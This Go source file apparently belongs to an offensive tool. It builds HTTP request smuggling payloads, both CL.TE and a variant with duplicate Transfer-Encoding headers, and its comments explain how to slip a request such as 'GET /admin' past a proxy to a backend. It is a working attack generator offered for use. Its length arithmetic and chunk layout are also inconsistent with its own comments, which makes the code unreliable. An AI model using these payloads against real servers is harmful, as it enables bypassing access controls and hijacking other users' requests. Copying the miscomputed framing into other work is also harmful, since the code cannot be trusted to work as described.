package payload

import (
	"fmt"
	"strings"
)

// GenerateCLTE creates a CL.TE (Content-Length / Transfer-Encoding) smuggling payload.
//
// TECHNIQUE EXPLANATION:
// In CL.TE desynchronization:
// 1. Proxy sees Content-Length header and uses it to determine message boundaries
// 2. Backend sees Transfer-Encoding: chunked and processes chunked encoding instead
// 3. The smuggled request ends up in the next request's processing space
//
// PAYLOAD STRUCTURE:
// - First request: appears complete to proxy (Content-Length accurate for visible part)
// - Contains chunked encoding that backend processes
// - Chunk 0 closes the "logical" request for backend
// - Remaining data = smuggled request that backend reads as part of next HTTP request
//
// baseRequest: the request line + headers (without final CRLF)
// smoggledBody: the HTTP request to smuggle (e.g., "GET /admin HTTP/1.1\r\nHost: ...")
func GenerateCLTE(baseRequest string, smoggledBody string) string {
	var buf strings.Builder

	// Build the visible part that the proxy will send
	// This includes the request line, headers, and the beginning of chunked encoding

	buf.WriteString(baseRequest)

	// Transfer-Encoding header tells backend to expect chunks
	buf.WriteString("Transfer-Encoding: chunked\r\n")

	// Content-Length: We calculate the length of the data the proxy will forward
	// Proxy counts: first chunk size (hex) + CRLF + "0" + CRLF + CRLF + smuggled request
	//
	// Structure visible to proxy:
	// 5\r\n
	// 0\r\n  (first chunk contains "0", then CRLF, then content-length boundary)
	// \r\n
	// [smuggled request]
	//
	// We want Content-Length to cover only what we want the proxy to read as "this request"
	// The smuggled body will be hidden after the chunk boundary

	contentLengthValue := 4 + len("\r\n") // "5\r\n" size + the chunk delimiter
	buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))

	// End headers
	buf.WriteString("\r\n")

	// Chunk size (hex) for first chunk - we'll put a small placeholder
	buf.WriteString("5\r\n")
	// Chunk data (5 bytes)
	buf.WriteString("0\r\n\r\n")
	// End chunk (0 size)
	buf.WriteString("0\r\n")
	buf.WriteString("\r\n")

	// Smuggled request follows - backend will treat this as start of next request
	buf.WriteString(smoggledBody)

	return buf.String()
}

// GenerateCLTEAmbiguous creates a variant of CL.TE with intentional ambiguity.
// Uses multiple Transfer-Encoding header values to trigger parser differences.
//
// Some parsers might honor the first TE header, others the last, exploiting this difference.
func GenerateCLTEAmbiguous(baseRequest string, smoggledBody string) string {
	var buf strings.Builder

	buf.WriteString(baseRequest)

	// Ambiguous: multiple Transfer-Encoding headers
	// Some parsers concatenate values, others take the last one
	buf.WriteString("Transfer-Encoding: identity\r\n")
	buf.WriteString("Transfer-Encoding: chunked\r\n")

	// Content-Length marks boundary where proxy stops reading
	contentLengthValue := 4 + 4 // approximate chunk size
	buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))

	buf.WriteString("\r\n")

	// Chunked encoding begins
	buf.WriteString("5\r\n")
	buf.WriteString("0\r\n\r\n")
	buf.WriteString("0\r\n\r\n")

	// Smuggled request
	buf.WriteString(smoggledBody)

	return buf.String()
}
